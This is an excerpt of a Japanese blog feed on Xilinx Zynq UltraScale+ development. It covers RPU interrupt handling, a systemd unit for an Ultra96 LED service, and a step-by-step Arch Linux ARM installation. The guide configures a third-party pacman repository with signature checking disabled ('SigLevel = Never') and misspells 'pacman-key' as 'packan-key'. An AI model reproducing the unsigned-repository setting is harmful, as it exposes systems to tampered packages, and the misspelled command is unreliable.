<span id="cb40-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-11" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb40-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-12" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb40-13"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-14"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-14" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> <span class="op">(;;)</span> <span class="op">{</span></span>
<span id="cb40-15"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-15" aria-hidden="true" tabindex="-1"></a>  <span class="kw">asm</span> <span class="at">volatile</span><span class="op">(</span><span class="st">&quot;wfi&quot;</span><span class="op">);</span></span>
<span id="cb40-16"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-17"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-17" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span><span class="at">const</span> <span class="kw">auto</span> req <span class="op">=</span> ipi_req<span class="op">.</span>exchange<span class="op">(</span><span class="dv">0</span><span class="op">,</span> <span class="bu">std::</span>memory_order_relaxed<span class="op">);</span> req <span class="op">&amp;</span> <span class="bn">0x8000'0000</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb40-18"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-18" aria-hidden="true" tabindex="-1"></a>    <span class="co">// TTC 割り込みがあったときの処理</span></span>
<span id="cb40-19"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-19" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb40-20"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb40-20" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>これでどちらもそれっぽく動いているものの、正直 <code>volatile</code> と同様に <code>&lt;atomic&gt;</code> についても詳しいわけではないので、この使い方がアリなのかあまり自信がありません。Rust の<a href="https://docs.rust-embedded.org/book/concurrency/#atomic-access">この資料</a>とかは一例として紹介されたりはしていますね。</p>
<h3 id="rpu-の-lock-step-mode-と-tcm">RPU の Lock-Step Mode と TCM</h3>
<p>RPU は Tightly Coupled Memory (TCM) とよばれる特別なメモリ領域にプログラムを配置できます。TCM はキャッシュを介さない予測可能時間でのアクセスや ECC が付いていたりする、RPU らしいメモリです。しかしこの TCM、容量がコア毎に 64 KB x 2 なので、ちょっと大きなものを載せようとすると厳しいことがあります。実際、開発中に <code>.text</code> が 64 KB を超えて収まらなくなったことがありました。</p>
<p>この対策 (?) になりそうな方法の1つとして、RPU を Lock-Step で動かすというのがあります。TRM によれば</p>
<blockquote>
<p>During the lock-step operation, the TCMs that are associated with the redundant processor become available to the lock-step processor. The size of ATCM and BTCM become 128 KB each with BTCM supporting interleaved accesses from processor and AXI slave interface.</p>
</blockquote>
<p>とあるためです。で、実際に linker script を変えてみたのですが…なんだかあやしいです。デバッガーでロードさせると問題ないのに、<code>boot.bin</code> に入れて FSBL で Linux と一緒にロードさせると途中で RPU 側のアプリケーションがお亡くなりになってしまうのです。デバッガーを使うと問題ないというのが厄介で、結局調査は諦めました。<code>.text</code> が 64 KB 超えた問題も、ちょっとコード変えただけで余裕で収まるようになりましたし。しかし謎…。</p>
<h3 id="systemd-unit-file-を追加して-ubuntu-のブート時にいろいろ動かす">Systemd Unit File を追加して Ubuntu のブート時にいろいろ動かす</h3>
<p>Linux 側で動かすアプリケーションは、電源を投入したら何もせず勝手に動いてほしいです。今回は Ubuntu が動いているので、そこに Systemd の unit file を追加して実現しました。こんな感じです。</p>
<div class="sourceCode" id="cb41"><pre class="sourceCode ini"><code class="sourceCode ini"><span id="cb41-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="kw">[Unit]</span></span>
<span id="cb41-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb41-2" aria-hidden="true" tabindex="-1"></a><span class="dt">Description</span><span class="ot">=</span><span class="st">Trigger IPI to flash LEDs</span></span>
<span id="cb41-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb41-3" aria-hidden="true" tabindex="-1"></a><span class="dt">Wants</span><span class="ot">=</span><span class="st">modprobe@uio_pdrv_genirq.service</span></span>
<span id="cb41-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb41-4" aria-hidden="true" tabindex="-1"></a><span class="dt">After</span><span class="ot">=</span><span class="st">modprobe@uio_pdrv_genirq.service</span></span>
<span id="cb41-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb41-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb41-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb41-6" aria-hidden="true" tabindex="-1"></a><span class="kw">[Service]</span></span>
<span id="cb41-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb41-7" aria-hidden="true" tabindex="-1"></a><span class="dt">Type</span><span class="ot">=</span><span class="st">simple</span></span>
<span id="cb41-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb41-8" aria-hidden="true" tabindex="-1"></a><span class="dt">ExecStart</span><span class="ot">=</span><span class="st">/usr/bin/ipi-led</span></span>
<span id="cb41-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb41-9" aria-hidden="true" tabindex="-1"></a><span class="dt">DevicePolicy</span><span class="ot">=</span><span class="st">closed</span></span>
<span id="cb41-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb41-10" aria-hidden="true" tabindex="-1"></a><span class="dt">DeviceAllow</span><span class="ot">=</span><span class="st">char-uio</span></span>
<span id="cb41-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb41-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb41-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb41-12" aria-hidden="true" tabindex="-1"></a><span class="kw">[Install]</span></span>
<span id="cb41-13"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb41-13" aria-hidden="true" tabindex="-1"></a><span class="dt">WantedBy</span><span class="ot">=</span><span class="st">multi-user.target</span></span></code></pre></div>
<p>Systemd 世代なら見慣れた記述だと思います。カーネルモジュール <code>uio_pdrv_genirq</code> に依存しているので、それを <code>modprobe@uio_pdrv_genirq.service</code> と指定しています。<code>[Service]</code> で指定した処理は特に何もしなければ root で動いてしまうので、本格的に何かやろうとするなら別ユーザーで動かすなど権限を絞るべきです。今回は一発ネタなので手を抜いています。とはいえ何もしないのもおもしろくないので、お気持ち程度のリソース制限を付けました。<code>DevicePolicy=closed</code> と <code>DeviceAllow=char-uio</code> を設定して、<code>ipi-led</code> からは <code>/dev/null</code>, <code>/dev/zero</code> などの基本的なデバイスと <code>/dev/uio*</code> しか見えなくなっているはずです。</p>
<p><code>ipi-led</code> 以外にもいくつかの unit file を追加しています。まずは <a href="https://github.com/Tosainu/earthly-zynqmp-example/blob/27538797d4663eb2637bf9e8570dc23e7465f126/linux/rootfs/etc/systemd/system/maximize-root-partition.service"><code>maximize-root-partition.service</code></a> です。<code>disk.img.zst</code> で作った Linux 側のパーティションは 256 MiB しかないので、最初にブートしたときに <code>parted</code> と <code>resize2fs</code> を呼び出してリサイズします。リサイズが済んだらもう役目はないので、unit file の中で <code>systemctl disable</code> しています。</p>
<p>もう1つが <a href="https://github.com/Tosainu/earthly-zynqmp-example/blob/27538797d4663eb2637bf9e8570dc23e7465f126/linux/rootfs/etc/systemd/system/setup-usb-ether.service"><code>setup-usb-ether.service</code></a> で、USB Gadget を使ったネットワーク接続を設定します。USB Gadget 経由のネットワークは想像していたより快適でした。Ultra96 実機上で複雑な作業をするのであればぜひオススメしたいです。ちなみに、これに関連して <code>system-top-append.dts</code> に PS-GTR の refclock の設定や USB 関連の pinctrl の設定を追加しています。設定しないとないと相手 PC 側で突然 disconnect 扱いになってしまうなど不安定でした。PS-GTR の refclock 情報は <code>.xsa</code> に入っていた気がするので、それだけでも やってくれるといいのになと思いました。</p>
<blockquote class="twitter-tweet tw-align-center" data-dnt="true">
<p lang="cs" dir="ltr">
naruhodo <a href="https://t.co/iapfw9ABxP">pic.twitter.com/iapfw9ABxP</a>
</p>
— ✧<em>。ヾ(｡ᐳ﹏ᐸ｡)ﾉﾞ。</em>✧ (@myon___) <a href="https://twitter.com/myon___/status/1518165469169332224?ref_src=twsrc%5Etfw">April 24, 2022</a>
</blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<p>せっかくなので、USB で繋いだらすぐ SSH できるようにと Ubuntu 環境に <code>openssh-server</code> も入れようとしていました。ただ、Ubuntu の <code>openssh</code> パッケージはパッケージがインストールされるときに host key を生成しているようだったため見送りました<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fn9" class="footnote-ref" id="fnref9" role="doc-noteref"><sup>9</sup></a>。こうしたファイルを配布も想定したディスクイメージに含めたくないし、かと言って何かしらの workaround を設定するのも面倒だったので。</p>
<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>もっと言えば、インターネットから拾ってきた実行ファイルをむやみに実行したくないのでソースコードからビルドしています。Earthly の最新機能を追うきっかけにもなりますしね。<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>BSP とかの <code>Makefile</code> を見ると <code>-j10</code> がハードコーディングされていたり、一方でどう見てもターゲットの依存関係や並列ビルドであやしくなりそうな箇所がありますよね…。Earthly が持つ、ある条件での処理をコンテナ内で1度だけ実行するという特徴は、こういったヤツらのトラブルを避けるのにも有効です。<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p>何も意識せずに <code>tar.xz</code> を指定して、やけに時間かかるなーってなる出来事がありました…<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn4" role="doc-endnote"><p>FSBL の <code>psu_init()</code> 前に実行されてしまうから…？<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn5" role="doc-endnote"><p>あるいはキャッシュを意図的に消すか GC がかからない限り。<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn6" role="doc-endnote"><p>パッケージマネージャなど、何かをダウンロードする系とは相性がよさそうです。一方でビルドキャッシュに使うのは注意な気がします、特に C や C++ を使っている場合。<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fnref6" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn7" role="doc-endnote"><p>APU にデフォルトで割り当てられているのは channel 0 です。ただしこれは、XSCT が生成した Devicetree ノード <code>mailbox@ff990400</code> や OpenAMP 関連の資料にあるように PMU とやりとりするのに使っているようです。RPU 0 とやりとりで扱うビットに影響しない気もしますが、わざわざほかのプロセッサやソフトウェアが既に使っている領域を共有する必要もないです。channel 7 以降は未割り当てなのでこれを使います。<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fnref7" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn8" role="doc-endnote"><p>SoC 内のあらゆるリソースが同じメモリ空間にアクセスできるの、Zynq のおもしろく強力であり、同時にコワイところですよね。ちなみに XSCT が生成する <code>.dts</code> はデフォルトで何でも有効になっているので、RPU などからさわるリソースは <code>status</code> を <code>disabled</code> または <code>reserved</code> にしたり、PL 上のリソースは <code>/delete-node/</code> するのがよいです。デバイスドライバーによっては probe の段階でペリフェラルにリセットかけたりとかしちゃうので。<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fnref8" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn9" role="doc-endnote"><p>これに限らず、Ubuntu とかのパッケージはインストール時の hook でいろいろやり過ぎな気がします。特にパッケージに含まれるサービスをその場で start してくるやつが本当に好きじゃないです。ソフトウェアの設定を確認する前に勝手に動き出しちゃうってこわくないですか。<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fnref9" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>]]></summary>
</entry>
<entry>
    <title>Ultra96 で Arch Linux ARM を動かす</title>
    <link href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/index.html" />
    <id>https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/index.html</id>
    <published>2020-11-28T15:48:11Z</published>
    <updated>2020-11-28T15:48:11Z</updated>
    <summary type="html"><![CDATA[<p><a href="https://www.xilinx.com/products/silicon-devices/soc/zynq-ultrascale-mpsoc.html">Zynq UltraScale+ MPSoC</a> をはじめとする Xilinx の各種プラットフォーム上で、決められた用途の Linux ベースなシステムを構築するなら公式で提供されている <a href="https://www.xilinx.com/products/design-tools/embedded-software/petalinux-sdk.html">PetaLinux Tools</a> が便利です。以前取り上げた <a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/">Ultra96 のアレ</a>でも使っています。一方で、動かした Linux 環境の上で雑な作業したいなどの用途では、構築後の拡張がしにくい PetaLinux Tools は微妙です。例えば Raspberry Pi 向けに提供される <a href="https://www.raspberrypi.org/software/">Raspberry Pi OS</a> のような汎用の Linux ディストリビューションベースの環境が欲しくなります。</p>
<p>Ultra96 向けに提供される汎用の Linux ディストリビューションベースな環境として、例えば <a href="http://www.pynq.io/">PYNQ</a> が Ubuntu ベースらしかったり、<a href="https://github.com/ikwzm/ZynqMP-FPGA-Linux">ikwzm さんの Debian 10 イメージ</a> などが見つかります。ただ、自分としては普段使って慣れている <a href="https://www.archlinux.org/">Arch Linux</a> 環境があるともっと嬉しいな… ということで、<a href="https://archlinuxarm.org/">Arch Linux ARM</a> を動かしてみました。</p>
<p><img src="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/screenfetch.png" /></p>
<p>この記事では、前半でインストール方法の一例を、後半で関連するファイル類などをあげた GitHub リポジトリ <a href="https://github.com/Tosainu/zynqmp-arch">Tosainu/zynqmp-arch</a> について紹介していきます。</p>
<!--more-->
<h2 id="インストール方法">インストール方法</h2>
<h3 id="準備">準備</h3>
<p>作業にあたって必要なツールなどは次の通りです。</p>
<ul>
<li>Linux 環境 (Arch Linux, Ubuntu, CentOS など)</li>
<li><a href="https://www.xilinx.com/products/design-tools/vitis.html">Vitis 2020.1</a><a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a></li>
<li>ライブラリを静的リンクした QEMU の User space emulator</li>
<li><a href="https://github.com/archlinux/arch-install-scripts">arch-install-scripts</a></li>
</ul>
<p>今回紹介するインストール方法には、Linux 環境がインストールされた PC が必要です。特に後半の作業は Arch Linux があると楽ですが、Vitis がサポートする Ubuntu や CentOS でも大丈夫だと思います。ちなみに自分は Arch Linux を使い、Vitis は <a href="https://wiki.archlinux.org/index.php/Systemd-nspawn">systemd-nspawn</a> を使って構築した Ubuntu 環境内で動かしています<a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>。</p>
<p><a href="https://www.xilinx.com/html_docs/xilinx2020_1/vitis_doc/upu1569395223804.html">Xilinx Software Command-Line Tool</a> (xsct) や同梱される aarch64 と microblaze 向けクロスコンパイラなども利用するため Vitis が必要です。Vivado だけではだめです</p>
<p>インストールの後半、SD カードに展開した Arch Linux ARM システム初期設定のため chroot する作業があります。もちろんターゲットが ARM なので、直接 chroot はできません。今回は QEMU の力を借ります。QEMU は、<a href="https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html">binfmt_misc</a> と組み合わせて aarch64 向けの ELF をあたかも作業マシン上で直に実行できるかのようにしておきます。Arch Linux であれば AUR の <a href="https://aur.archlinux.org/packages/binfmt-qemu-static/">binfmt-qemu-static</a> と <a href="https://aur.archlinux.org/packages/qemu-user-static/">qemu-user-static</a> パッケージが利用できます (<a href="https://wiki.archlinux.org/index.php/QEMU#Chrooting_into_arm/arm64_environment_from_x86_64">ArchWiki</a>)。Docker イメージの <a href="https://github.com/multiarch/qemu-user-static">multiarch/qemu-user-static</a> を使うのも簡単です。</p>
<p>Arch Linux 環境に chroot する際には arch-install-scripts の <a href="https://jlk.fjfi.cvut.cz/arch/manpages/man/extra/arch-install-scripts/arch-chroot.8.en"><code>arch-chroot</code></a> が便利です。Arch Linux では <code>pacman</code> からインストールできます。それ以外のディストリビューションでも、(使えるかは未確認ですが) こんな感じにインストールできます。もちろん <code>arch-chroot</code> を使わない方法もありますが、ここでは取り扱いません。</p>
<pre><code>$ git clone https://github.com/archlinux/arch-install-scripts
$ cd arch-install-scripts
$ make
$ make install PREFIX=~/.local</code></pre>
<h3 id="fpga-デザインの作成">FPGA デザインの作成</h3>
<p>まずは Vivado で FPGA のデザインを作成します。とりあえず動かすものなら、IP Integrator で Zynq UltraScale+ MPSoC ブロックを配置するだけでよいと思います。</p>
<p>Ultra96 に載ってる Bluetooth を使いたい場合には少し設定が必要です。<a href="https://github.com/Avnet/Ultra96-PYNQ">Avnet/Ultra96-PYNQ</a> リポジトリなどの情報によれば、まず PS の設定から UART 0 の MODEM にチェックを入れて</p>
<p><img src="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/psconfig.png" /></p>
<p>そのあと PS のブロックから生えた <code>emio_uart0_ctsn</code>, <code>emio_uart0_rtsn</code> を適当な名前のポートで外に出します。</p>
<p><img src="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/ps.png" /></p>
<p>あとはこんな感じの <code>.xdc</code> ファイルを追加して外に出したポートにピンを割り当てればよいそうです。</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode tcl"><code class="sourceCode tcl"><span id="cb2-1"><a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#cb2-1" aria-hidden="true" tabindex="-1"></a>set_property<span class="ot"> -dict</span> <span class="kw">{</span> PACKAGE_PIN B7   IOSTANDARD LVCMOS18 <span class="kw">}</span> <span class="kw">[</span>get_ports <span class="kw">{</span> BT_ctsn <span class="kw">}]</span>; </span>
<span id="cb2-2"><a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#cb2-2" aria-hidden="true" tabindex="-1"></a>set_property<span class="ot"> -dict</span> <span class="kw">{</span> PACKAGE_PIN B5   IOSTANDARD LVCMOS18 <span class="kw">}</span> <span class="kw">[</span>get_ports <span class="kw">{</span> BT_rtsn <span class="kw">}]</span>;</span></code></pre></div>
<p>作成したデザインの Bitstream 生成まで済ませたら <code>.xsa</code> ファイルを出力します。TCL Console から次のコマンドを実行するのが簡単です。</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode tcl"><code class="sourceCode tcl"><span id="cb3-1"><a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#cb3-1" aria-hidden="true" tabindex="-1"></a>write_hw_platform<span class="ot"> -fixed -include_bit</span> <span class="ot">system</span>.xsa</span></code></pre></div>
<h3 id="sd-カードへのインストール">SD カードへのインストール</h3>
<p>時間のかかる Arch Linux ARM の tarball のダウンロードから始めるのがおすすめです。Arch Linux ARM は、特定のプラットフォーム向けのもののほか汎用の (Generic) tarball が提供されており、今回はその aarch64 版を使います。<a href="https://archlinuxarm.org/platforms/armv8/generic">ここ</a> から <code>ArchLinuxARM-aarch64-latest.tar.gz</code> をダウンロードしておきます。</p>
<p>SD カードには少なくとも2つのパーティションを作ります。1つが後ほど作成する <code>BOOT.BIN</code> やカーネルを置くもの、残りが Arch Linux ARM の rootfs を展開するものです。</p>
<p>パーティションテーブルの操作には <code>fdisk</code> を使うことにします。第1引数に接続した SD カードに対応するデバイス (ここでは <code>/dev/sdX</code>) を渡して起動し</p>
<pre><code>$ sudo fdisk /dev/sdX</code></pre>
<p>まずは <code>o</code> コマンドで新しく空のパーティションテーブルを作成します。</p>
<pre><code>Command (m for help): o
Created a new DOS disklabel with disk identifier 0xad9770e8.</code></pre>
<p><code>n</code> コマンドで1つ目のパーティションを作成します。サイズは 100 ~ 200 MB 程度あれば十分だと思います。作成したパーティションは、<code>t</code> コマンドでタイプを W95 FAT16 (LBA) <code>0x0e</code> または W95 FAT32 (LBA) <code>0x0c</code> に変更しておきます。</p>
<pre><code>Command (m for help): n
Partition type
p   primary (0 primary, 0 extended, 4 free)
e   extended (container for logical partitions)
Select (default p): p
Partition number (1-4, default 1): 1
First sector (2048-124975103, default 2048):
Last sector, +/-sectors or +/-size{K,M,G,T,P} (2048-124975103, default 124975103): +200M

Created a new partition 1 of type 'Linux' and of size 200 MiB.

Command (m for help): t
Selected partition 1
Hex code or alias (type L to list all): e
Changed type of partition 'Linux' to 'W95 FAT16 (LBA)'.</code></pre>
<p>再度 <code>n</code> コマンドを使い、rootfs 用のパーティションを作っていきます。今回は残った領域全体を1つのパーティションにしました。</p>
<pre><code>Command (m for help): n
Partition type
p   primary (1 primary, 0 extended, 3 free)
e   extended (container for logical partitions)
Select (default p): p
Partition number (2-4, default 2):
First sector (411648-124975103, default 411648):
Last sector, +/-sectors or +/-size{K,M,G,T,P} (411648-124975103, default 124975103):

Created a new partition 2 of type 'Linux' and of size 59.4 GiB.</code></pre>
<p>最後に <code>w</code> コマンドでパーティションテーブルを反映させれば完了です。</p>
<pre><code>Command (m for help): w
The partition table has been altered.
Calling ioctl() to re-read partition table.
Syncing disks.</code></pre>
<p>パーティションを作り終わったら、1つ目のパーティションを FAT16 (または FAT32) <a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a>で、残りを適当なファイルシステム<a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a> (下の例は EXT4) でフォーマットします。</p>
<pre><code>$ sudo mkfs.vfat /dev/sdX1
$ sudo mkfs.ext4 /dev/sdX2</code></pre>
<p>フォーマットしたパーティションは、適当なディレクトリ (<code>/mnt</code> など) にマウントし、そこにダウンロードした <code>ArchLinuxARM-aarch64-latest.tar.gz</code> を展開します。</p>
<pre><code>$ sudo mount /dev/sdX2 /mnt
$ sudo mkdir -p /mnt/boot
$ sudo mount /dev/sdX1 /mnt/boot

$ sudo bsdtar -xpf ArchLinuxARM-aarch64-latest.tar.gz -C /mnt
$ sync</code></pre>
<h3 id="展開した-arch-linux-arm-環境の初期設定">展開した Arch Linux ARM 環境の初期設定</h3>
<p>SD カードに展開した Arch Linux ARM 環境は、そのままでは Ultra96 で動かすのに微妙です。例えば WiFi 関連パッケージが入っていないので、そのまま起動させても必要なパッケージを追加したりするのが難しかったりします。展開した環境に chroot し、パッケージの削除・更新・追加などをして実機で起動させたあと困らない状態にしておきます。</p>
<p>前述したとおり、chroot には <code>arch-chroot</code> コマンドを使います。<code>/dev</code> や <code>/sys</code> のマウント・アンマウントや、<code>/etc/resolv.conf</code> への symlink を張ってくれる便利なヤツです。</p>
<pre><code>$ sudo arch-chroot /mnt /bin/bash</code></pre>
<p>chroot したら、特に意味はないですが <code>lscpu</code> みたいなコマンドを実行してみるのがおすすめです。不思議な気持ちになれます。</p>
<pre><code># lscpu
Architecture:                    aarch64
CPU op-mode(s):                  32-bit, 64-bit
Byte Order:                      Little Endian
Address sizes:                   48 bits physical, 48 bits virtual
CPU(s):                          12
On-line CPU(s) list:             0-11
Thread(s) per core:              2
Core(s) per socket:              6
Socket(s):                       1
NUMA node(s):                    1
Vendor ID:                       AuthenticAMD
CPU family:                      23
Model:                           96
Model name:                      AMD Ryzen 5 PRO 4650U with Radeon Graphics
(...)</code></pre>
<p>Arch Linnux ARM 公式の手順通りに、まずは pacman keyring を初期化します。</p>
<pre><code># packan-key --init
# packan-key --populate archlinuxarm</code></pre>
<p>続いて <code>/etc/pacman.conf</code> を編集しパッケージリポジトリを追加します。ここで指定している <code>zynqmp-arch.myon.info</code> は、前述した GitHub リポジトリの GitHub Pages を使ってホストしているもので、Zynq UltraScale+ MPSoC 向けのカーネルや Ultra96-V2 の WiFi ドライバなどのパッケージを配布しています。このあたりの詳細については後ほど紹介します。</p>
<pre><code># cat &gt;&gt; /etc/pacman.conf &lt;&lt;EOS

[zynqmp-arch]
SigLevel = Never
Server = https://zynqmp-arch.myon.info/\$arch
EOS</code></pre>
<p>Arch Linux ARM の tarball は、この記事執筆時点での最終更新日が 2020/08/09 とちょっと古めなのでパッケージを更新しておきたいところです。ただその前にまず、今後使わなさそうなパッケージをアンインストールしておきます。特にカーネル (<code>linux-aarch64</code>) は、更新時の initramfs の再生成が結構時間がかかってつらいので消しておくとよいです。<code>pacman</code> に渡すオプションは、<code>dhcpcd</code> などはそれらが依存するパッケージも消すために <code>-Rncs</code> で、<code>linux-aarch64</code> はパッケージ単体を消すために <code>-Rnd</code> とするとよさそうです。</p>
<pre><code># pacman -Rncs dhcpcd net-tools netctl
# pacman -Rnd linux-aarch64</code></pre>
<p>そうしたら、システムのパッケージを更新したり</p>
<pre><code># pacman -Syu</code></pre>
<p>WiFi 接続に使う <code>iwd</code> や、<code>zynqmp-arch</code> リポジトリのカーネルや WiFi ドライバなど必要なパッケージをインストールします。</p>
<pre><code># pacman -S iwd
# pacman -S linux-zynqmp
# pacman -S wilc3000-ultra96v2 wilc-firmware</code></pre>
<p>いろいろパッケージのインストールが済んだら、必要なくなったパッケージのアンインストールもしておくとよいでしょう。</p>
<pre><code># pacman -Rncs $(pacman -Qdtq)</code></pre>
<p>ユーザアカウントや <code>/etc/fstab</code> の設定<a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a>をして完了です。<code>exit</code> で chroot 環境を抜けます。</p>
<pre><code># passwd
# passwd alarm

# cat &gt;&gt; /etc/fstab &lt;&lt;EOS
/dev/mmcblk0p2 /     ext4 defaults 0 1
/dev/mmcblk0p1 /boot vfat defaults 0 2
EOS

# exit</code></pre>
<h3 id="ブートローダファームウェアのビルド">ブートローダ・ファームウェアのビルド</h3>
<p>最後に、First Stage Boot Loader (FSBL) や U-Boot といったブートローダと、ARM Trusted Firmware や PMU のファームウェアの準備、およびそれらをまとめたブートイメージ <code>BOOT.BIN</code> を作ります。これらの手順は、<a href="https://xilinx-wiki.atlassian.net/wiki/spaces/A/pages/460653138/Xilinx+Open+Source+Linux">Xilinx Wiki のこのあたり</a> にまとまっているので、あわせて確認するとよいでしょう。</p>
<p>FSBL と PMU Firmware のソースコードは、Xilinx Software Command-Line Tool を使って出力できます。まず、Vivado で出力した <code>.xsa</code> ファイルを、新たに作成したディレクトリにコピーしておきます。これは、このあと <code>xsct</code> で呼び出す <a href="https://www.xilinx.com/html_docs/xilinx2020_1/vitis_doc/dxk1575554094185.html"><code>hsi::open_hw_design</code></a> コマンドが、<code>.xsa</code> ファイルあるディレクトリにその中身<a href="https://blog.myon.info/entry/2020/11/29/archlinux-arm-on-zu/#fn6" class="footnote-ref" id="fnref6" role="doc-noteref"><sup>6</sup></a>を展開してくるためです。</p>
<pre><code>$ mkdir xsct &amp;&amp; cd $_
$ cp /path/to/system.xsa .</code></pre>
<p><code>xsct</code> コマンドを実行し、そのインタプリタで次のコマンドを実行します。単にソースコードを出力させるだけならもっと簡単にできるのですが、メッセージの出力を UART 1 に変更するためこうなっています。これらコマンドを実行すると、最初に作成したディレクトリの <code>fsbl</code>, <code>pmufw</code> にそれぞれのソースコードが出力されます。</p>
<pre><code>$ xsct

xsct% set hw_design [hsi open_hw_design system.xsa]

xsct% set sw_design [hsi create_sw_design fsbl -proc psu_cortexa53_0 -os standalone]
xsct% hsi set_property CONFIG.stdin  psu_uart_1 [hsi get_os]
xsct% hsi set_property CONFIG.stdout psu_uart_1 [hsi get_os]
xsct% hsi add_library xilffs
xsct% hsi add_library xilpm
xsct% hsi add_library xilsecure
xsct% hsi generate_app -hw $hw_design -sw $sw_design -app zynqmp_fsbl -dir fsbl
xsct% hsi close_sw_design $sw_design

xsct% set sw_design [hsi create_sw_design pmufw -proc psu_pmu_0 -os standalone]
xsct% hsi set_property CONFIG.stdin  psu_uart_1 [hsi get_os]
xsct% hsi set_property CONFIG.stdout psu_uart_1 [hsi get_os]
xsct% hsi add_library xilfpga
xsct% hsi add_library xilsecure
xsct% hsi add_library xilskey
xsct% hsi generate_app -hw $hw_design -sw $sw_design -app zynqmp_pmufw -dir pmufw
xsct% hsi close_sw_design $sw_design

xsct% exit</code></pre>
<p>実行するコマンドは TCL のスクリプトにしておき、それを <code>xsct</code> コマンドに渡してもいいかもしれません。</p>
<pre><code>$ xsct script.tcl</code></pre>
